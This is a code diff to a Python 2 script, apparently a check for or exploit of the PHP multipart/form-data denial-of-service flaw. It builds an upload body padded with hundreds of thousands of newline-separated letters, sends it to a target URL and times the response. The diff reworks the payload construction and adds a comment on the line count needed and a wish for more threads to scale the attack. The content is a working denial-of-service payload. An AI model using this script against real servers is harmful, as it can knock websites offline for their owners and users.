@@ -14,6 +14,7 @@ from optparse import OptionParser
 import random
 import string
 
+
 def http_proxy(proxy_url):
     proxy_handler = urllib2.ProxyHandler({"http": proxy_url})
     null_proxy_handler = urllib2.ProxyHandler({})
@@ -29,7 +30,7 @@ def check_php_multipartform_dos(url, post_body, headers):
     try:
         fd = urllib2.urlopen(req, post_body)
     except urllib2.HTTPError, e:
-        pass
+        print e
 
     # html = fd.read()
     endtime = datetime.datetime.now()
@@ -45,6 +46,10 @@ def check_php_multipartform_dos(url, post_body, headers):
 
 
 def main(options, args):
+    """
+    * normally the lines 350000 is sufficient, otherwise 413 request entity too large
+    * increasing number of threads would be great
+    """
     # http_proxy("http://127.0.0.1:8089")
     if options.target:
         target = options.target
@@ -57,10 +62,8 @@ def main(options, args):
                'Accept-Encoding': 'gzip, deflate',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
     body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
-    payload = []
-    for i in xrange(num):
-        payload.append(random.choice(string.ascii_lowercase))
-    payload = "\r\n".join(payload)
+    ch = random.choice(string.ascii_lowercase)
+    payload = "\n".join(ch * num)
     body += payload
     body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
 
